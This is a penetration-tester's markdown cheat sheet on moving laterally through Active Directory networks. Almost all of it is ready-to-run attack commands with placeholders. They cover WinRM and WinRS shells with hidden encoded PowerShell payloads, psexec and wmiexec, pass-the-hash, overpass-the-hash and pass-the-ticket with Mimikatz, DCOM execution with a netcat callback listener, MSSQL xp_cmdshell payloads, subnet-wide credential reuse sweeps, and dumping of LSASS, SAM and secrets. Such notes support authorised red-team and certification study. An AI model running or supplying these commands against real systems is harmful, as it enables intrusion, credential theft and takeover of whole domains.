---
title: AD Lateral Movement
type: note
tab: Active Directory
inputs: [Username, Password, Hash, TGT, Shell]
outputs: [Shell, Hash, Credentials]
tags: [ActiveDirectory, Windows, LateralMovement, SMB, NTLM, Kerberos]
---

# AD Lateral Movement

## WHY

Use valid creds/hash/tickets to reach more hosts, dump more creds, and move toward DA.

## WHEN

- Creds or hash may be local admin somewhere.
- WinRM/SMB is open.
- BloodHound shows admin rights or sessions.

## NEXT

- Got shell/local admin: dump creds.
- Found path to DA: [[Privesc]]

## Commands

### WinRM

### WinRM With Evil-WinRM

#Username #Password #Windows #ActiveDirectory #LateralMovement
Check WinRM access and connect with Evil-WinRM.

```sh
# Check whether WinRM accepts the credential.
nxc winrm <TARGET_IP> -u <USER> -p '<PASS>'

# Open an interactive WinRM shell.
evil-winrm -i <TARGET_IP> -u <USER> -p '<PASS>'

# Load PowerShell scripts and executables from local tool folders.
evil-winrm -i <TARGET_IP> -u <USER> -p '<PASS>' -s /opt/tools/ps_scripts/
evil-winrm -i <TARGET_IP> -u <USER> -p '<PASS>' -e /opt/tools/executables/

# Inside Evil-WinRM.
upload /local/file.exe C:\Temp\file.exe
download C:\sensitive\file.txt /local/
menu
```

### WinRM With PowerShell Remoting

#Username #Password #Windows #ActiveDirectory #LateralMovement
Use native PowerShell remoting with a credential object.

```powershell
$username = '<USER>'
$password = '<PASS>'
$secureString = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString
New-PSSession -ComputerName <TARGET_HOST> -Credential $credential
Enter-PSSession 1
```

### WinRM With WinRS

#Username #Password #Windows #ActiveDirectory #LateralMovement
Use `winrs` for a simple remote shell or command execution over WinRM.

```cmd
# Open an interactive WinRS shell.
winrs -r:<TARGET_HOST> -u:<USER> -p:<PASS> cmd

# Run a one-off command over WinRS.
winrs -r:<TARGET_HOST> -u:<USER> -p:<PASS> "cmd /c hostname & whoami"

# Execute an encoded PowerShell payload over WinRS.
winrs -r:<TARGET_HOST> -u:<USER> -p:<PASS> "powershell -nop -w hidden -e <BASE64_PAYLOAD>"
```

### SMB Remote Execution

#Username #Password #SMB #Windows #ActiveDirectory #LateralMovement
Use psexec or NetExec for command execution after confirming admin rights.

```sh
# Interactive psexec shell.
impacket-psexec <DOMAIN>/<USER>:<PASS>@<TARGET_IP>

# One-off command execution.
nxc smb <TARGET_IP> -u <USER> -p '<PASS>' -x "cmd /c \"whoami && hostname && ipconfig /all\""
nxc smb <TARGET_IP> -u <USER> -p '<PASS>' -x "cmd /c \"type C:\Users\Administrator\Desktop\proof.txt && ipconfig /all && whoami\""
```

### Pass The Hash

#Username #Hash #SMB #NTLM #Windows #ActiveDirectory #LateralMovement
Test an NTLM hash, then use SMB/WMI execution if the account has admin rights.

```sh
# Check whether the hash is valid and has admin rights.
nxc smb <TARGET_IP> -u <USER> -H <NTLM_HASH>

# Interactive SMB service execution.
impacket-psexec <DOMAIN>/<USER>@<TARGET_IP> -hashes :<NTLM_HASH>

# WMI command shell.
impacket-wmiexec <DOMAIN>/<USER>@<TARGET_IP> -hashes :<NTLM_HASH>
```

### WMI Exec With Password

#Username #Password #WMI #Windows #ActiveDirectory #LateralMovement
Use Impacket WMI execution with valid domain or local admin credentials.

```sh
impacket-wmiexec <DOMAIN>/<USER>:<PASS>@<TARGET_IP>
```

### Overpass The Hash With Mimikatz

#Username #Hash #Kerberos #Windows #ActiveDirectory #LateralMovement
Use Mimikatz overpass-the-hash to spawn a Kerberos-capable PowerShell session, then reach another host.

```powershell
# Target Windows shell: create a new logon session from an NTLM hash.
mimikatz.exe
privilege::debug
sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<NTLM_HASH> /run:powershell

# New PowerShell/CMD: force Kerberos use and confirm tickets.
klist
net use \\<TARGET_HOST>\IPC$
klist

# Move laterally if the user has rights.
cd C:\Tools\SysInternalSuite
.\PsExec.exe \\<TARGET_HOST> cmd
```

### Pass The Key With Impacket

#Username #Hash #Kerberos #ActiveDirectory #LateralMovement
Get a TGT with an NTLM hash, then use the ticket with Kerberos-aware tools.

```sh
# Request a TGT from an NTLM hash.
impacket-getTGT <DOMAIN>/<USER> -hashes :<NTLM_HASH>

# Point Impacket tools at the generated Kerberos cache.
export KRB5CCNAME=<USER>.ccache

# Use Kerberos auth for remote execution.
impacket-psexec -k -no-pass <DOMAIN>/<USER>@<TARGET_HOST>
```

### Pass The Ticket

#TGT #Kerberos #Windows #ActiveDirectory #LateralMovement
Export Kerberos tickets with Mimikatz, inject the useful CIFS ticket, and access the target share.

```powershell
# Target Windows shell: export available tickets.
mimikatz.exe
privilege::debug
sekurlsa::tickets /export
exit

# Target Windows shell: find the CIFS ticket for the target host.
dir *.kirbi

# Target Windows shell: inject the ticket and confirm access.
mimikatz.exe
privilege::debug
kerberos::ptt <TICKET_FILE>.kirbi
exit
klist
dir \\<TARGET_HOST>\backup
```

### DCOM MMC20 Execution

#Shell #Windows #ActiveDirectory #LateralMovement
Use the MMC20 DCOM object for remote command execution when you have the needed privileges.

```powershell
# Attacker: catch the callback.
nc -lvnp <LPORT>

# Target PowerShell: create a remote MMC20 object and execute a payload.
powershell -ep bypass
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1", "<TARGET_IP>"))
$dcom.Document.ActiveView.ExecuteShellCommand("powershell", $null, "-e <BASE64_PAYLOAD>", "7")
```

### MSSQL xp_cmdshell

#Username #Password #Windows #ActiveDirectory #LateralMovement
Use MSSQL admin access to enable `xp_cmdshell`, run commands, and execute a payload.

```sh
# Attacker: connect with Windows authentication.
impacket-mssqlclient '<DOMAIN>/<USER>:<PASS>'@<MSSQL_HOST> -windows-auth

# MSSQL: enable xp_cmdshell and run commands.
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXECUTE xp_cmdshell 'whoami';
EXECUTE xp_cmdshell 'whoami /priv';
EXECUTE xp_cmdshell 'powershell -e <BASE64_PAYLOAD>';
```

### Subnet Reuse / Admin Checks

### Subnet Reuse With Password

#Username #Password #SMB #Windows #ActiveDirectory #LateralMovement
Sweep a subnet with plaintext credentials and test domain or local auth.

```sh
# Test domain auth across the subnet.
nxc smb <TARGET_SUBNET> -u <USER> -p '<PASS>'

# Test local account reuse across the subnet.
nxc smb <TARGET_SUBNET> -u <USER> -p '<PASS>' --local-auth
```

### Subnet Reuse With NTLM Hash

#Username #Hash #SMB #NTLM #Windows #ActiveDirectory #LateralMovement
Sweep a subnet with an NTLM hash and test domain or local auth.

```sh
# Test domain auth with the NTLM hash.
nxc smb <TARGET_SUBNET> -u <USER> -H <NTLM_HASH>

# Test local account hash reuse across the subnet.
nxc smb <TARGET_SUBNET> -u <USER> -H <NTLM_HASH> --local-auth
```

### RDP

#Username #Password #Windows #ActiveDirectory #LateralMovement
Check RDP access, and enable RDP through SMB only when you already have admin rights.

```sh
# Check whether RDP is enabled and the credential is accepted.
nxc rdp <TARGET_IP> -u <USER> -p '<PASS>'

# Enable RDP through SMB admin rights if needed.
nxc smb <TARGET_IP> -u <USER> -p '<PASS>' -M rdp -o ACTION=enable
```

### Credential Dumping After Local Admin

#Username #Password #SMB #NTLM #Windows #ActiveDirectory #CredentialDumping
Dump local secrets remotely after confirming local admin access.

```sh
# Full secretsdump with plaintext credentials.
impacket-secretsdump <DOMAIN>/<USER>:<PASS>@<TARGET_IP>

# Full secretsdump with NTLM hash.
impacket-secretsdump <USER>@<TARGET_IP> -hashes :<NTLM_HASH>

# LSASS dump with lsassy.
lsassy -d <DOMAIN> -u <USER> -p '<PASS>' <TARGET_IP>

# SAM dump with NetExec.
nxc smb <TARGET_IP> -u <USER> -p '<PASS>' --sam

# NetExec credential dumping modules.
nxc smb <TARGET_SUBNET> -u <USER> -p '<PASS>' -M lsassy
nxc smb <TARGET_SUBNET> -u <USER> -p '<PASS>' -M nanodump
```

## Key Notes

- Local admin on one box often leads to more hashes and more lateral paths.
- WinRM shell is clean and comfortable when enabled.
- Pass-the-hash does not need plaintext password.
